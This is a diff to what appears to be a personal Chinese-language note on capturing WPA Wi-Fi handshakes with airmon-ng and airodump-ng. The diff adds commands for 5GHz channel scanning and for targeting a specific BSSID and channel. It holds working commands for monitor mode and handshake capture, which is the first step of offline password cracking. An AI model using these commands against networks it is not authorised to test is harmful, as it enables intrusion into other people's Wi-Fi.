@@ -1,13 +1,20 @@
+[Link](https://www.mzbky.com/106.html)
 
 被动方式
 ```sh
-lusb # 看有没有显示
+# 不报错可用
+modprobe -nv rt2800usb
+
+lsusb # 看有没有显示
 ifconfig # 查看 wlan0 无线网卡
 airmon-ng # 查看是否支持监听模式 显示wlan0 支持
 airmon-ng check kill # 可能需要 ifconfig eth0 down 关闭其他 eth
 airmon-ng start wlan0 # 开启监听
 
-airodump-ng wlan0  # 扫描 wifi
+airodump-ng wlan0  # 扫描 wifi 2.4G
+airodump-ng -C 5180-5885 wlan0mon # 扫5G
+airodump-ng -C 5765 wlan0mon
+## iw list  # 检查支持的频段 网卡不支持5G频段，就无法搜索到5GHz信号
 
 # BSSID             PWR   Beacons	CH  # CH wifi频段11
 # 60:32:B1:56:3F:B2 -32   24      11
@@ -16,6 +23,7 @@ airodump-ng wlan0  # 扫描 wifi
 
 # 只用此方式抓包较慢
 airodump-ng -c 11 --bssid 60:32:B1:56:3F:B2 -w /home/kali/tmp/handshake wlan0
+airodump-ng -c 153 wlan0 # 路由器看了下我的WIFI5信道是153 5G, 是可以抓到的
 
 # 第一行 CH  9 ][ Elapsed: 27 s ][ 2023-01-14 22:40 ][ WPA handshake: 34:36:54:D8:1F:A9 # 显示 handshake 为攻击成功, 这时Ctrl+C退出命令
 ```
